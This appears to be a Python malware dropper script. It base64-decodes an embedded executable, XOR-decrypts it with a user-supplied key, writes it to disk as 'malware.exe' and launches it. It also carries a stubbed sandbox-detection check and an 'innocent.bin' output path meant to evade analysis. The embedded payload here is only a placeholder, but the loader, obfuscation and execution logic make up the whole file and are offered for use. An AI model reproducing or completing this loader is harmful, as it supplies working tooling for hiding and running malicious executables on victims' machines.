import base64
import sys
import os
import argparse
import subprocess


embedded_exe_b64 = '''hello'''

def xor_bytes(data: bytes, key: bytes) -> bytes:
    """XORs the given data with the key (repeating key if necessary)."""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def process_file(input_path: str, output_path: str, key: bytes) -> None:
    """Reads `input_path`, XORs its contents with `key`, and writes to `output_path`."""
    if not os.path.isfile(input_path):
        raise FileNotFoundError(f"File not found: {input_path}")

    with open(input_path, 'rb') as f:
        data = f.read()

    result = xor_bytes(data, key)

    with open(output_path, 'wb') as f:
        f.write(result)


def process_embedded_exe(output_path: str, key: bytes) -> None:
    """XORs and writes the embedded EXE to disk."""
    # Decode embedded binary
    data = base64.b64decode(embedded_exe_b64)

    # XOR it
    result = xor_bytes(data, key)

    # Write to disk
    with open(output_path, 'wb') as f:
        f.write(result)


def run_file(path: str) -> None:
    """Attempts to execute the file at `path`."""
    try:
        if sys.platform == 'win32':
            os.startfile(path)
        else:
            subprocess.Popen([path], shell=True)
    except Exception as e:
        print(f"Error running file '{path}': {e}")

def sandbox_check() -> bool:
    return False

def main():
    parser = argparse.ArgumentParser(description="XOR a file with a key and optionally run the result.")
    parser.add_argument('-f', '--file', dest='file', default='input.bin',
                        help='Path to input file (default: input.bin)')
    parser.add_argument('-k', '--key', dest='key', default='secret',
                        help='Encryption/decryption key (string) (default: secret)')
    parser.add_argument('-n', '--no-run', action='store_true', dest='no_run',
                        help="Skip running the processed file after XOR")
    args = parser.parse_args()

    # Convert key directly to bytes
    key_bytes = args.key.encode('utf-8')
    input_path = args.file

    # if the user inserted -n, just xor the binary
    if (args.no_run):
        # XOR process
        process_file(input_path, "./innocent.bin", key_bytes)
        print(f"Processed file saved to: innocent.bin")
        return

    # the user didn't use -n == check for sandbox, decrypt and run
    if (sandbox_check()):
        print("THIS IS A SANDBOX!")
        return

    # XOR process
    process_embedded_exe("./malware.exe", key_bytes)
    print(f"Processed file saved to: ./malware.exe")

    print(f"Running processed file: malware.exe")
    run_file(".\\malware.exe")
    return

if __name__ == '__main__':
    main()

